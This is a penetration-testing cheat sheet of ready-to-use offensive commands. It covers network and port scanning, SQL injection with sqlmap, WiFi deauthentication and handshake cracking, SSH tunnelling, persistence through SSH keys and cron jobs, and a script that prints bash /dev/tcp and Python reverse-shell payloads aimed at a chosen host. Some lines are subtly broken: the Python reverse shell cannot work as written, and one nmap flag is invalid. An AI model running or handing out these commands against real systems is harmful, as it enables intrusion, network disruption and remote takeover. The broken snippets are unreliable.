## 🎯 One-Liners That Save Time

### Recon
```bash
# Quick network map
nmap -sn 192.168.1.0/24 | grep "Nmap" | cut -d" " -f5

# Find live hosts
for ip in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$ip & done | grep from

# Port scan common
nmap -F 192.168.1.1

# Service version
nmap -sV --script-defaults 192.168.1.1
```

### Web
```bash
# Find hidden params
dirb http://target /usr/share/wordlists/dirb/common.txt

# Quick test all payloads
sqlmap -u "http://target/?id=1" --batch --level=5

# Spider
wget -r -l 5 --spider http://target
```

### WiFi
```bash
# Handshake capture
airodump-ng wlan0mon --bssid XX --channel 6 --write handshake

# Deauth
aireplay-ng -0 10 -a XX wlan0mon

# Crack
aircrack-ng -w wordlist.txt handshake.cap
```

## 💡 Pro Tips

### 1. TMUX Workflow
```bash
# Start new session
tmux new -s pentest

# Split panes
# Ctrl+b " - horizontal
# Ctrl+b % - vertical

# Navigate
# Ctrl+b arrows

# Detach: Ctrl+b d
# Attach: tmux attach -t pentest
```

### 2. SSH Tunnel
```bash
# Local port forward
ssh -L 8080:localhost:80 user@target

# Dynamic proxy
ssh -D 8080 user@target

# Remote port forward
ssh -R 8080:localhost:80 user@target
```

### 3. File Transfer
```bash
# HTTP server
python3 -m http.server 8000

# SCP
scp file.txt user@target:/path/

# Netcat
nc -lvp 1234 > file.txt   # Receiver
nc target 1234 < file.txt  # Sender
```

### 4. Persistence
```bash
# SSH key
ssh-keygen -t rsa
ssh-copy-id user@target

# Cron job
crontab -e
# Add: 0 * * * * /path/to/script.sh
```

## 🛠️ Custom Scripts to Have

### Quick Enum
```bash
#!/bin/bash
echo "=== Quick Enum ==="
echo "Users: $(cat /etc/passwd | grep -v nologin | wc -l)"
echo "Sudo: $(getent group sudo | wc -l)"
echo "Ports: $(ss -tulpn | wc -l)"
echo "Services: $(ls /etc/init.d/ | wc -l)"
```

### Auto-Recon
```bash
#!/bin/bash
target=$1
nmap -sV -oN scan-$target.nmap $target
nikto -h $target > nikto-$target.txt
dirb http://$target > dirb-$target.txt
echo "Done! Check files."
```

### Payload Generator
```bash
#!/bin/bash
# Quick reverse shell
echo "Bash: bash -i >& /dev/tcp/$1/$2 0>&1"
echo "Python: python -c 'import socket,subprocess;s=socket.socket();s.connect((\"$1\",$2));s.send(subprocess.call([\"/bin/sh\",\"-i\"]).encode())'"
```
